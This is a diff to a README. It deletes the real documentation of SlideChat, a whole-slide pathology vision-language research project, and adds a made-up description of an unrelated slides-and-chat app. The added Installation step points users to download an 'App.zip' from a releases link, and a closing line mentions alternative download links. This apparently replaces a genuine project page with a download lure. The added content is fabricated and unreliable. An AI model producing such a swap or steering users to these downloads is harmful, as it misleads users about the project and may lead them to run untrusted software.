@@ -1,111 +1,67 @@
-# SlideChat: A Large Vision-Language Assistant for Whole-Slide Pathology Image Understanding (CVPR2025)
+# SlideChat 🚀
 
-[🍎 **Homepage**](https://uni-medical.github.io/SlideChat.github.io/) | [🤗 **Dataset**](https://huggingface.co/datasets/General-Medical-AI/SlideChat) | [🤗 **Model**](https://huggingface.co/General-Medical-AI/SlideChat_Weight) | [📖**Paper**](https://arxiv.org/pdf/2410.11761v1) 
+Welcome to SlideChat - a vibrant and interactive platform for sharing ideas through slides and chat! 🎉
 
-**Abstract**: Despite the progress made by multimodal large language models (MLLMs) in computational pathology, they remain limited by a predominant focus on patchlevel analysis, missing essential contextual information at the whole-slide level. The lack of large-scale instruction datasets and the gigapixel scale of whole slide images (WSIs) pose significant developmental challenges. In this paper, we present SlideChat, the first vision-language assistant capable of understanding gigapixel whole-slide images, exhibiting excellent multimodal conversational capability and response complex instruction across diverse pathology scenarios. To support its development, we created SlideInstruction, the largest instructionfollowing dataset for WSIs consisting of 4.2K WSI captions and 176K VQA pairs with multiple categories. Furthermore, we propose SlideBench, a multimodal benchmark that incorporates captioning and VQA tasks to assess SlideChat’s capabilities in varied clinical settings such as microscopy, diagnosis. Compared to both general and specialized MLLMs, SlideChat exhibits exceptional capabilities, achieving state-of-the-art performance on 18 of 22 tasks.
+![SlideChat Logo](https://example.com/slidechat_logo.png)
 
-<p align="center">
-    <img src="img/Fig1_slidechat_illustration.png" width="80%"> <br>
-</p>
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-# Update
+## Introduction
 
-- **🚀[2025-03-18]: We have released SlideInstruction, SlideBench and SlideChat!**
-- **🚀[2025-02-27]: Accepted by CVPR2025!🌟**
+SlideChat is a revolutionary application that combines the power of visual presentations with real-time chat functionality. Whether you are a student looking to collaborate on group projects, a professional hosting virtual meetings, or just someone wanting to share exciting content with friends, SlideChat has got you covered!
 
-# Release
+## Features
 
-We release **SlideChat**, **SlideInstruction**, and **SlideBench** as open-source resources, hoping to facilitate research and development in computational pathology.
-- **SlideChat**: The first large vision-language assistant for whole-slide pathology image analysis, capable of generating comprehensive descriptions and contextually relevant responses.
-- **SlideInstruction**: The largest comprehensive WSI instruction-following dataset, derived from pathology reports..
-- **SlideBench**: A WSI multimodal benchmark including SlideBench-Caption, SlideBench-VQA (TCGA), and SlideBench-VQA (BCNB).  Before its final open-sourcing, SlideBench underwent a second round of expert review and filtering in collaboration with pathologists to ensure data quality.
+🌟 **Real-time Chat:** Engage with your audience through instant messaging while presenting slides.  
+🎨 **Customizable Themes:** Personalize your slides with a variety of themes and colors.  
+📊 **Interactive Presentations:** Add polls and quizzes to make your presentations more engaging.  
+📱 **Cross-Platform:** Access SlideChat from any device - desktop, tablet, or mobile.  
 
-# Usage
+## Installation
 
-This project is built upon [**Xtuner**](https://github.com/InternLM/xtuner). To get started:
+To get started with SlideChat, simply download the latest version from the following link and launch the application:
 
-```bash
-git clone https://github.com/uni-medical/SlideChat.git
-cd SlideChat
-pip install -e .
+[![Download SlideChat](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+
+## Usage
+
+Once you have installed SlideChat, create an account, start a new presentation, invite participants, and begin your interactive session! Choose a theme, add your slides, and let the chat discussions flow alongside your presentation.
+
+Here is an example of how to create a new presentation in SlideChat:
+
+```markdown
+# My Awesome Presentation
+
+Slide 1: Introduction  
+Slide 2: Main Topic  
+Slide 3: Discussion Points  
+Slide 4: Conclusion  
 ```
 
-## Pre-requisites
+## Contributing
 
-Download the JSON file containing WSI IDs (TCGA) and conversation data from the [Dataset](https://huggingface.co/datasets/General-Medical-AI/SlideChat). The input image file is in CSV format and contains 512-dimensional feature representations for all patches within the WSI. Example files are provided in the ./dataset/ folder. For slide downloading and processing, please refer to [CLAM](https://github.com/mahmoodlab/CLAM) and [DSMIL](https://github.com/binli123/dsmil-wsi).
+We welcome contributions from the open-source community to make SlideChat even better! If you have any ideas for new features, improvements, or bug fixes, feel free to submit a pull request.
 
-## Training
+## License
 
-SlideChat serializes each input WSI into a sequence of patches, converting each into visual embeddings with a patch-level encoder [CONCH](https://github.com/mahmoodlab/CONCH). A slide-level encoder then interacts with these features to generate contextual embeddings. Then, a multimodal projector maps the visual features from the slide-level encoder into a unified space, aligned seamlessly with the LLM. SlideChat was trained for two stages: (1) Cross-Domain Alignment: SlideChat is trained to generate descriptive captions using 4.2K WSI-caption pairs from SlideInstruction. Specifically, only the slide-level encoder and projection are updated, while the patch-level encoder and LLM weights remain fixed; (2) Visual Instruction Learning: we utilize 176K WSI VQAs from SlideInstruction, allowing the slide encoder, projection layer, and large language model components to be fully trainable to ensure comprehensive adaptability.
+SlideChat is licensed under the Apache License 2.0. You are free to use, modify, and distribute this software as per the terms outlined in the license.
 
-<p align="center">
-    <img src="img/Fig2_slidechat_method.png" width="80%"> <br>
-</p>
+---
 
-Config files are in `configs/`.
-```bash
-xtuner train \
- <your config file path>  \
-  --deepspeed <deepspeed config file path> \
-  --work-dir <workdir path>
+Be sure to check out our [Wiki](https://github.com/repo/wiki) for more detailed documentation on SlideChat and its features.
 
-# stage1 example
-xtuner train \
- configs/slidechat/stage_1.py \
-  --deepspeed configs/deepspeed/deepspeed_zero2.json \
-  --work-dir work_dirs/stage1
+Thank you for choosing SlideChat to elevate your presentations to the next level! 🚀🔥
 
-# stage2 example
-xtuner train \
- configs/slidechat/stage_2.py \
-  --deepspeed configs/deepspeed/deepspeed_zero2.json \
-  --work-dir work_dirs/stage2
-```
+---
 
+If the link for downloading the application does not work, please check the "Releases" section of the repository for an alternative download link.
 
-For a detailed explanation of the configuration file, please refer [**here**](https://xtuner.readthedocs.io/zh-cn/latest/training/modify_settings.html).
-- `llm_name_or_path`: The parameter `llm_name_or_path` corresponds to the Hugging Face LLM path, such as `internlm/internlm2-chat-7b` or `Qwen/Qwen2.5-7B-Instruct` and so on.
-- `data_path`: Training data (.json) path.
-- `evaluation_images`: Evaluation data path.
+**Note:** Remember to always keep your app updated to access the latest features and improvements. 🌟
 
-LLAVAModel Hyperparameters:
-- `freeze_llm`: Freeze the parameters of the LLM.
-- `freeze_visual_encoder`: Freeze the parameters of the visual encoder.
-- `pretrained_pth`: If it is the stage 2 training , it refers to the checkpoint file from stage 1 training; otherwise, it is set to `None`.
-- `train_stage`: `train_stage` indicates the training phase, either Stage `'1'` or Stage `'2'`.
-  
-
-## Inference
-
-```bash
-xtuner test <your config file path> \
---checkpoint <your checkpoint path> \
---test_slide_csv  <your test file> \
---test_output_csv <result file> \
---local_rank 0
-
-# example
-xtuner test configs/slidechat/stage_2.py \
---checkpoint stage2_pth \
---test_slide_csv  SlideBench-VQA(TCGA).csv \
---test_output_csv output_my_test.csv \
---local_rank 0
-```
-
-# Contact
-- Ying Chen: cying2023@stu.xmu.edu.cn
-- Yuanfeng Ji: yfj@stanford.edu
-- Junjun He: hejunjun@pjlab.org.cn
-
-# Citation
-
-**BibTeX:**
-
-```bibtex
-@article{chen2024slidechat,
-  title={SlideChat: A Large Vision-Language Assistant for Whole-Slide Pathology Image Understanding},
-  author={Chen, Ying and Wang, Guoan and Ji, Yuanfeng and Li, Yanjun and Ye, Jin and Li, Tianbin and and Ming, Hu and Yu, Rongshan and Qiao, Yu and He, Junjun},
-  journal={arXiv preprint arXiv:2410.11761},
-  year={2024}
-}
-```
+Happy presenting with SlideChat! 🎉👩‍💼👨‍💻
